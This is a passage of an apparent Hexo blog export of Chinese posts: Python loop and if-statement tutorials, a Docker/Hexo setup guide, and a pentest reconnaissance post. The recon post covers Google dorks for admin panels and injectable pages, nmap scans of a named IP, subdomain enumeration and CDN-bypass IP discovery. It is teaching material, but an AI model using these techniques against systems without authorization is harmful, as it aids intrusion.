class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(i)    <span class="comment">#0 1 2 4 5</span></span><br></pre></td></tr></table></figure><h2 id="for循环嵌套"><a href="#for循环嵌套" class="headerlink" title="for循环嵌套"></a>for循环嵌套</h2><p>for循环也是可以进行嵌套的</p><p>案例：10以内的乘法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        print(<span class="string">&#x27;&#123;&#125;x&#123;&#125;=&#123;&#125;&#x27;</span>.format(a,b,a*b))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1.信息收集</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>对于渗透测试而言，第一步我们首先需要掌握的就是对目标进行必要的信息收集，正所谓知己知彼方为百战不殆，在信息搜集中，最关键的就是收集服务器的配置信息和目标网站敏感信息，其中包括域名及子域名信息、目标网站系统、CMS指纹、目标网站真实IP、开放的端口等网站相关内容，我们都应该尽可能的去收集</p><a id="more"></a><hr><h1 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h1><p>通常收集域名信息采用whois查询和备案查询的方式查询该域名的DNS服务器信息和注册人的联系信息</p><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）</p><p>注意：根据ICANN公布的《通用顶级域名注册数据临时政策细则》和欧盟通用数据保护条例合规要求，全面调整 WHOIS 公开显示的信息</p><p>即：注册商提供WHOIS查询公开信息中将不再显示域名注册人、管理联系人和技术联系人的个人数据，包括姓名、邮箱、电话、街道地址等，只会显示注册商及到期日期等。而且该调整已于2018年5月25日开始生效</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201002154624532.png" alt="image-20201002154624532"></p><h2 id="whois查询途径"><a href="#whois查询途径" class="headerlink" title="whois查询途径"></a>whois查询途径</h2><ul><li><p>爱站工具网（<a href="https://whois.aizhan.com/%EF%BC%89">https://whois.aizhan.com/）</a></p></li><li><p>站长之家（<a href="http://whois.chinaz.com)/">http://whois.chinaz.com）</a></p></li><li><p>VirusTotal（ <a href="https://www.virustotal.com/">https://www.virustotal.com</a> ）</p></li><li><p>kali也自带了查询工具</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201006171941727.png" alt="image-20201006171941727"></p></li></ul><h2 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h2><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生</p><p>对于国内的诸多网站，大多都进行了ICP备案登记的，我们可以直接通过查询备案的方式更加精准的查到对应信息</p><p>注意：主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201002155212313.png" alt="image-20201002155212313"></p><h2 id="备案查询途径"><a href="#备案查询途径" class="headerlink" title="备案查询途径"></a>备案查询途径</h2><ul><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></li><li>天眼查：<a href="https://beian.tianyancha.com/">https://beian.tianyancha.com/</a></li><li>站长工具：<a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></li><li>工业和信息化部：<a href="http://www.beian.miit.gov.cn/">http://www.beian.miit.gov.cn/</a></li></ul><hr><h1 id="敏感信息查询"><a href="#敏感信息查询" class="headerlink" title="敏感信息查询"></a>敏感信息查询</h1><h2 id="谷歌语法"><a href="#谷歌语法" class="headerlink" title="谷歌语法"></a>谷歌语法</h2><p>Google是世界上最强的搜索引擎之一，其构造的特殊关键字搜索语法能够有效的帮我们检索到需要的信息，并且他的语法绝大部分被其他搜索引擎所继承通用</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201002175424324.png" alt="image-20201002175424324"></p><p>例如检索查找edu.cn(中国高校)的后台管理页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Site:edu.cn intext:后台管理</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201002175619950.png" alt="image-20201002175619950"></p><p>例如检索查找可能存在的php id注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:.php?id&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201002180508157.png" alt="image-20201002180508157"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>子域名枚举可以发现更多评估范围相关的域名/子域名，以增加漏洞发现机率；<br>探测到更多隐藏或遗忘的应用服务，这些应用往往可导致一些严重漏洞；</p><h3 id="方法一：谷歌语法"><a href="#方法一：谷歌语法" class="headerlink" title="方法一：谷歌语法"></a>方法一：谷歌语法</h3><p>就如前文所提到的使用谷歌语法进行查询</p><p>使用site:目标域名,可以查询到被收录了的其他域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:bilibili.com</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201006101029361.png" alt="image-20201006101029361"></p><h3 id="方法二：在线子域名爆破"><a href="#方法二：在线子域名爆破" class="headerlink" title="方法二：在线子域名爆破"></a>方法二：在线子域名爆破</h3><p>爆破网址:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;domain&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201006103241735.png" alt="image-20201006103241735"></p><h3 id="方法三：Loyer子域名挖掘机"><a href="#方法三：Loyer子域名挖掘机" class="headerlink" title="方法三：Loyer子域名挖掘机"></a>方法三：Loyer子域名挖掘机</h3><p>使用枚举的形式进行探测</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201006103915976.png" alt="image-20201006103915976"></p><h3 id="方法四：Maltego"><a href="#方法四：Maltego" class="headerlink" title="方法四：Maltego"></a>方法四：Maltego</h3><p>一个国外的工具，可以根据DNS进行探测</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201006104224236.png" alt="image-20201006104224236"></p><hr><h2 id="收集常用端口信息"><a href="#收集常用端口信息" class="headerlink" title="收集常用端口信息"></a>收集常用端口信息</h2><p>在渗透测试的过程中，对端口信息的收集是一个很重要的过程，通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务，就可以对症下药，便于我们渗透目标服务器</p><h3 id="常见的扫描端口工具"><a href="#常见的扫描端口工具" class="headerlink" title="常见的扫描端口工具"></a>常见的扫描端口工具</h3><p><strong>Nmap</strong></p><p>默认扫描：nmap 106.52.110.188<br>指定端口扫描：nmap –p 3306 106.52.110.188<br>完整扫描到端口、服务及版本：nmap –v –sV 106.52.110.188</p><p><strong>Masscan</strong></p><p><strong>Zmap</strong></p><p><strong>御剑高速TCP端口扫描工具</strong></p><p><strong>Shodan</strong></p><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p><strong>在线端口扫描</strong></p><p><a href="http://www.t1shopper.com/tools/port-scan/">http://www.t1shopper.com/tools/port-scan/</a></p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>现在大量的网址是使用cms进行的二次开发，故相同的cms存在的漏洞也可能在目标网站上存在，找到对应的cms指纹可以简化测试过程</p><h3 id="常见指纹识别工具"><a href="#常见指纹识别工具" class="headerlink" title="常见指纹识别工具"></a>常见指纹识别工具</h3><p><strong>御剑web指纹识别系统</strong></p><p><strong>BugScaner</strong></p><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p><strong>云悉指纹</strong></p><p><a href="http://www.yunsee.cn/">http://www.yunsee.cn/</a></p><h2 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h2><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br>参考资料：<a href="https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bbs.geekxk.com&#x2F;robots.txt</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201006105527739.png" alt="image-20201006105527739"></p><p>可以把查询出来的路径，CMS的名字，放入百度进行搜索，从而判断cms</p><hr><h1 id="查找真实的IP"><a href="#查找真实的IP" class="headerlink" title="查找真实的IP"></a>查找真实的IP</h1><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>全称Content Delivery Network，即内容分发网络，CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问的网络中，在用户访问网站时，由距离最近的缓存服务器直接响应用户请求。</p><h2 id="全球ping检测"><a href="#全球ping检测" class="headerlink" title="全球ping检测"></a>全球ping检测</h2><p>很多网站的CDN会专门针对国内或者国外，所以使用全球ping可能会得到真实的ip地址</p><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com</a></p><p><a href="https://www.wepcc.com/">https://www.wepcc.com/</a></p><h2 id="查询网查询"><a href="#查询网查询" class="headerlink" title="查询网查询"></a>查询网查询</h2><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><a href="https://webiplookup.com/">https://webiplookup.com/</a></p><h2 id="子域名IP"><a href="#子域名IP" class="headerlink" title="子域名IP"></a>子域名IP</h2><p>很多主站会挂CDN，但分站不会，有些分站跟主站在同一台服务器或者同一个C段内，就可以通过查询子域名对应的 IP 来查找。<br><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><h2 id="泄露文件"><a href="#泄露文件" class="headerlink" title="泄露文件"></a>泄露文件</h2><p>如phpinfo、github泄露等</p><h2 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><p>例如：fofa，shodan</p><h2 id="旁站IP"><a href="#旁站IP" class="headerlink" title="旁站IP"></a>旁站IP</h2><p>用whios查询管理员其它的域名，可能与目标域名在同一个服务器，并且未做cdn</p><h2 id="查询网址"><a href="#查询网址" class="headerlink" title="查询网址"></a>查询网址</h2><p><a href="https://securitytrails.com/">https://securitytrails.com/</a></p><h2 id="证书查询"><a href="#证书查询" class="headerlink" title="证书查询"></a>证书查询</h2><p><a href="https://crt.sh/">https://crt.sh/</a><br><a href="https://censys.io/">https://censys.io/</a></p><h2 id="内部邮箱"><a href="#内部邮箱" class="headerlink" title="内部邮箱"></a>内部邮箱</h2><p>收到邮件后，显示邮件原文，即可看到如下画面</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201006111011086.png" alt="image-20201006111011086"></p><hr><h1 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h1><h2 id="为什么要收集敏感目录文件？"><a href="#为什么要收集敏感目录文件？" class="headerlink" title="为什么要收集敏感目录文件？"></a>为什么要收集敏感目录文件？</h2><p>在渗透测试中，最关键的一步就是探测web目录结构和隐藏的敏感文件，因为可以获取到网站的后台管理页面、文件上传页面、甚至可以扫出网站的源代码</p><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><ul><li><p><strong>7KBwebpathBurute</strong></p></li><li><p><strong>御剑</strong></p></li><li><p><strong>dirb</strong></p></li><li><p><strong>在线信息泄露扫描</strong></p><p><a href="https://scan.top15.cn/web/infoleak">https://scan.top15.cn/web/infoleak</a></p></li><li><p><strong>Burp爬虫</strong></p></li><li><p><strong>Awvs</strong></p></li><li><p><strong>Nessus</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2.Docker搭建hexo环境(内附镜像链接)</title>
      <link href="%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/hexo%E7%9B%B8%E5%85%B3/%E8%BF%90%E7%BB%B4%E7%9B%B8%E5%85%B3/hexo/2.Docker%E6%90%AD%E5%BB%BAhexo%E7%8E%AF%E5%A2%83/"/>
      <url>%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/hexo%E7%9B%B8%E5%85%B3/%E8%BF%90%E7%BB%B4%E7%9B%B8%E5%85%B3/hexo/2.Docker%E6%90%AD%E5%BB%BAhexo%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>因为我之前的hexo环境搭建在VMware里面，但是太麻烦，占用资源太多，而且Hyper-V还冲突，所以直接就在Docker中搭建了</p><a id="more"></a><hr><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><p>docker以及安装完成，通过官方仓库获得了centos7的镜像</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200906171446905.png" alt="image-20200906171446905"></p><h2 id="启动镜像进入容器"><a href="#启动镜像进入容器" class="headerlink" title="启动镜像进入容器"></a>启动镜像进入容器</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -it --name centos-hexo centos:centos7</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200906171902039.png" alt="image-20200906171902039"></p><p>安装git和epel-release</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install git -y</span><br><span class="line">yum install epel-release -y</span><br></pre></td></tr></table></figure><h2 id="安装npm环境"><a href="#安装npm环境" class="headerlink" title="安装npm环境"></a>安装npm环境</h2><p>由于yum源中的npm版本太低，会导致hexo无法初始化，所以不适用yum安装</p><h3 id="安装wget"><a href="#安装wget" class="headerlink" title="安装wget"></a>安装wget</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install wget -y</span><br></pre></td></tr></table></figure><h3 id="下载nodejs安装包"><a href="#下载nodejs安装包" class="headerlink" title="下载nodejs安装包"></a>下载nodejs安装包</h3><p>最新安装包链接可以通过<a href="https://nodejs.org/en/download/">官网</a>获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir nodejs</span><br><span class="line">cd nodejs</span><br><span class="line">wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v12.18.3&#x2F;node-v12.18.3-linux-x64.tar.xz</span><br></pre></td></tr></table></figure><h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf node-v12.18.3-linux-x64.tar.xz</span><br></pre></td></tr></table></figure><h3 id="部署bin文件"><a href="#部署bin文件" class="headerlink" title="部署bin文件"></a>部署bin文件</h3><p>我们需要找到nodejs的bin文件的绝对路径，然后通过ln进行关联</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200906173106016.png" alt="image-20200906173106016"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;nodejs&#x2F;node-v12.18.3-linux-x64&#x2F;bin&#x2F;node &#x2F;usr&#x2F;bin&#x2F;node</span><br><span class="line">ln -s &#x2F;nodejs&#x2F;node-v12.18.3-linux-x64&#x2F;bin&#x2F;npm &#x2F;usr&#x2F;bin&#x2F;npm</span><br></pre></td></tr></table></figure><h3 id="测试nodejs"><a href="#测试nodejs" class="headerlink" title="测试nodejs"></a>测试nodejs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200906173429554.png" alt="image-20200906173429554"></p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><h3 id="安装hexo命令"><a href="#安装hexo命令" class="headerlink" title="安装hexo命令"></a>安装hexo命令</h3><p>然后就是正常的hexo安装流程了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>然后发现，hexo命令并没能全局</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200906185000826.png" alt="image-20200906185000826"></p><p>使用find命令找到</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200906185117725.png" alt="image-20200906185117725"></p><p>把他关联过去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;nodejs&#x2F;node_modules&#x2F;hexo-cli&#x2F;bin&#x2F;hexo &#x2F;usr&#x2F;bin&#x2F;hexo</span><br></pre></td></tr></table></figure><h3 id="创建博客文件夹并初始化博客"><a href="#创建博客文件夹并初始化博客" class="headerlink" title="创建博客文件夹并初始化博客"></a>创建博客文件夹并初始化博客</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir blog</span><br><span class="line">cd blog</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><h2 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h2><p>很难受，刚开始启动容器的时候，并没有将端口给映射出来，导致现在需要将容器打包成镜像，重新run映射端口</p><h3 id="找到当前容器ID"><a href="#找到当前容器ID" class="headerlink" title="找到当前容器ID"></a>找到当前容器ID</h3><p>打开新的cmd窗口，ps查询容器id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200907004531583.png" alt="image-20200907004531583"></p><h3 id="保存到镜像"><a href="#保存到镜像" class="headerlink" title="保存到镜像"></a>保存到镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit ed567c49427a kinght-centos-hexo</span><br></pre></td></tr></table></figure><p>然后查看镜像是否保存成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200907004647892.png" alt="image-20200907004647892"></p><h2 id="尝试运行hexo"><a href="#尝试运行hexo" class="headerlink" title="尝试运行hexo"></a>尝试运行hexo</h2><h3 id="端口映射启动"><a href="#端口映射启动" class="headerlink" title="端口映射启动"></a>端口映射启动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 4000:4000 -it --name kinght-blog kinght-centos-hexo:latest</span><br></pre></td></tr></table></figure><h3 id="运行hexo本地预览"><a href="#运行hexo本地预览" class="headerlink" title="运行hexo本地预览"></a>运行hexo本地预览</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>在本地浏览器中输入<code>http://localhost:4000/</code></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200907004901059.png" alt="image-20200907004901059"></p><h2 id="与宿主机共享目录"><a href="#与宿主机共享目录" class="headerlink" title="与宿主机共享目录"></a>与宿主机共享目录</h2><p>这里还是采用的创建容器时命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v E:\note\blog:&#x2F;note -p 4000:4000 -it --name kinght-blog kinghtxg&#x2F;kinght-centos-hexo:latest</span><br></pre></td></tr></table></figure><p>要求主机与容器都要使用绝对路径（或都是用相对路径）</p><p>尝试生成博客</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;note#打开共享文件夹</span><br><span class="line">cp * &#x2F;blog&#x2F;source&#x2F;_posts&#x2F;#将所有文档拷贝至博客目录</span><br><span class="line">cd blog</span><br><span class="line">hexo g#生成博客</span><br><span class="line">hexo s#本地预览博客</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200907011135730.png" alt="image-20200907011135730"></p><hr><h1 id="一键安装仓库"><a href="#一键安装仓库" class="headerlink" title="一键安装仓库"></a>一键安装仓库</h1><p>我已经将镜像上传到dockerhub了，可直接拉取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull kinghtxg&#x2F;kinght-centos-hexo:latest</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
          <category> hexo相关 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.python流程控制之if判断</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/12.python%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B9%8Bif%E5%88%A4%E6%96%AD/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/12.python%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B9%8Bif%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p>我们仔细回忆一下，所有的事情流程都可以分为三个模式，把事情一件一件的完成，然后遇到了选择，选择做哪件事，然后有些事情需要重复的做几次</p><p>在计算机中也是一样，程序的控制语句主要分三种：顺序、分支、判断</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200830091519903.png" alt="image-20200830091519903"></p><p>由于顺序结构是自然从上而下，所以就不需要单独的语法执行，所以只介绍分支(判断语句)和循环语句</p><p>并且无论分支(判断语句)还是循环语句，在执行完成后，依然会回到顺序结构上面</p><hr><h1 id="if判断语句"><a href="#if判断语句" class="headerlink" title="if判断语句"></a>if判断语句</h1><p>python使用缩进来判断代码级别，同一级别的代码会自上而下顺序执行</p><h2 id="语法1"><a href="#语法1" class="headerlink" title="语法1"></a>语法1</h2><h3 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h3><p>判断条件成立，成立则运行代码1、2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if 条件:</span><br><span class="line">    代码1</span><br><span class="line">    代码2</span><br><span class="line">    代码3</span><br></pre></td></tr></table></figure><h3 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">beautiful = <span class="literal">True</span></span><br><span class="line">name = <span class="string">&#x27;AYM&#x27;</span></span><br><span class="line"><span class="keyword">if</span>( age == <span class="number">18</span> <span class="keyword">and</span> beautiful == <span class="literal">True</span> <span class="keyword">and</span> name == <span class="string">&#x27;AYM&#x27;</span>):</span><br><span class="line">    print(<span class="string">&quot;我喜欢你，我们在一起吧&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="语法2"><a href="#语法2" class="headerlink" title="语法2"></a>语法2</h2><p>判断条件成立，成立则运行代码1、2，不成立则运行代码3、4</p><h3 id="伪代码-1"><a href="#伪代码-1" class="headerlink" title="伪代码"></a>伪代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if 条件:</span><br><span class="line">    代码1</span><br><span class="line">    代码2</span><br><span class="line">else:</span><br><span class="line">    代码3</span><br><span class="line">    代码4</span><br></pre></td></tr></table></figure><h3 id="演示代码-1"><a href="#演示代码-1" class="headerlink" title="演示代码"></a>演示代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">beautiful = <span class="literal">True</span></span><br><span class="line">name = <span class="string">&#x27;lurenjia&#x27;</span></span><br><span class="line"><span class="keyword">if</span>( age == <span class="number">18</span> <span class="keyword">and</span> beautiful == <span class="literal">True</span> <span class="keyword">and</span> name == <span class="string">&#x27;AYM&#x27;</span>):</span><br><span class="line">    print(<span class="string">&quot;我喜欢你，我们在一起吧&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;虽然你年轻漂亮，但你不是她&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="语法3"><a href="#语法3" class="headerlink" title="语法3"></a>语法3</h2><h3 id="伪代码-2"><a href="#伪代码-2" class="headerlink" title="伪代码"></a>伪代码</h3><p>判断条件成立，成立则运行代码1、2，不成立则运行继续运行下方的elif进行判断，遇到判断成立的则执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if 条件:</span><br><span class="line">    代码1</span><br><span class="line">    代码2</span><br><span class="line">elif 条件:</span><br><span class="line">    代码3</span><br><span class="line">    代码4</span><br><span class="line">elif 条件:</span><br><span class="line">    代码5</span><br><span class="line">    代码6</span><br><span class="line">elif 条件:</span><br><span class="line">    代码7</span><br><span class="line">    代码8</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><h3 id="演示代码-2"><a href="#演示代码-2" class="headerlink" title="演示代码"></a>演示代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 